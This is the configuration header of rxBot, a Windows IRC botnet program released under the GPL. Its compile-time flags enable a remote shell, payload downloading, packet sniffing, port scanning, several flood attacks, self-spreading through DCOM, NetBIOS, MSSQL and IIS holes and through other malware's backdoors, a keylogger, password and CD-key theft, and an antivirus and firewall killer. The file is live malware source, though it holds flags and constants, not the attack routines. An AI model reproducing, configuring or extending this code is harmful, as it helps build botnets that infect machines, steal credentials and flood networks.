/*

    rxBot - a modular IRC bot for Win32
    Copyright (C) 2004

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA

*/

// #define NO_IDENT       // disables Ident server
// #define NO_NETINFO     // disables Network info function
// #define NO_SYSINFO     // disables System info function
// #define NO_DCC         // disables DCC Chat/Send/Get functions
// #define NO_REMOTECMD   // disables Remote Command Shell function
// #define NO_PROCESS     // disables Process control (ps/kill) functions
// #define NO_DOWNLOAD    // disables Downloading/updating functions
// #define NO_FTPTRANS    // disables FTP Transfer functions
// #define NO_VISIT       // disables Visiting URLs
// #define NO_PSNIFF      // disables Psniff Carnivore function
// #define NO_CONNCHECK   // disables Check for internet connection
// #define NO_BOTVERSION  // disables Bot version
// #define NO_SCAN        // disables Port scanner
// #define NO_SECURE      // disables Secure functions
// #define NO_LSARESTRICT // disables LSA restriction functions
// #define NO_PING        // disables PING Flood
// #define NO_UDP         // disables UDP Flood
// #define NO_SYN         // disables SYN Flood
// #define NO_TCP         // disables TCP Flood
// #define NO_ICMP        // disables ICMP Flood
// #define NO_REDIRECT    // disables Port Redirect functions
// #define NO_SOCK4SERV   // disables SOCKS4 daemon functions
// #define NO_RLOGIN      // disables RLOGIN daemon functions
// #define NO_HTTP        // disables HTTP daemon functions
// #define NO_TFTP        // disables TFTP daemon functions
// #define NO_CDKEYS      // disables Game cd key checks
// #define NO_WILDCARD    // disables Wildcard authost
// #define NO_DCOM        // disables DCOM Spreader
// #define NO_NETBIOS     // disables NetBios Spreader
// #define NO_MSSQL       // disables MS SQL Spreader
// #define NO_MYDOOM      // disables MyDoom Spreader
// #define NO_BEAGLE      // disables Beagle Spreader
// #define NO_OPTIX       // disables Optix Spreader
// #define NO_NETDEVIL    // disables Netdevil Spreader
// #define NO_KUANG2      // disables Kuang2 Spreader
// #define NO_SUB7        // disables Sub7 Spreader
// #define NO_DAMEWARE    // disables DameWare Spreader
// #define NO_IIS5SSL     // disables IIS5 SSL Spreader
// #define NO_FINDPASS    // disables Find Password function
// #define NO_FINDFILE    // disables File search function
// #define NO_CAPTURE     // disables Screen Capture functions
// #define NO_KEYLOG      // disables Key logger function
// #define NO_EHANDLER    // disables Exception Handler function
// #define NO_CRASH       // disables Crash function
#define NO_REALNICK    // disables Real nick function
// #define NO_MIRCNICK    // disables mIRC nick prefix
// #define NO_MODEONCONN  // disables setting user modes on-connect
// #define NO_NET         // disables Net Share/Service control functions
#define NO_AVFW_KILL   // disables Anti-Virus & Firewall process killer
#define NO_REGISTRY    // disables Registry Monitor on startup function
#define NO_SECSYSTEM   // disables System Secure Monitor on startup function
// #define NO_MELT        // disables file melt (delete) on start-up
#define NO_CRYPT       // disables Crypted Strings (disabled when using DUMP_ENCRYPT)
#define DUMP_ENCRYPT   // enables encrypted string dump (enable for setup only!!)
// #define DEBUG_CRYPT    // enables bot string dump in order to try to debug the Crypt() function
// #define DEBUG_LOGGING  // enables protocol dumping to a log file for testing purposes
// #define DEBUG_CONSOLE  // enables debugging console for stdout/stderr for testing purposes

#ifdef DUMP_ENCRYPT
#define NO_CRYPT
#endif

#define MAXLOGINS		3
#define IRCLINE			512
#define MAXTHREADS		256
#define MAXALIASES		16
#define LOGSIZE			128
#define LOGLINE			128
#define MAXIDENT		128
#define MAXCHANLEN		128
#define MAX_LINES		500
#define MAXSCANTHRD		100
#define MAXSCANTIME		240
#define MAXURLLEN		256
#define MAXHOSTNAME		256
#define MAXIP			16
#define BLOCKSIZE		512
#define FLOOD_DELAY		2000
#define MAXSTRLEN		500
#define MAXNICKLEN		28
#define MAXPINGSIZE		65500
#define MAXTOKENS		32
#define MAXCMDLEN		300

#define AMPM(x) ((x>12)?("PM"):("AM"))
#define HOUR(x) ((x>12)?(x-12):(x))

#define fFD_ISSET(fd, set) __fWSAFDIsSet((SOCKET)(fd), (fd_set FAR *)(set))

#define addpredefinedaliases() \
		addalias("ctcp", "raw PRIVMSG $1 :$chr(1)$2-$chr(1)");
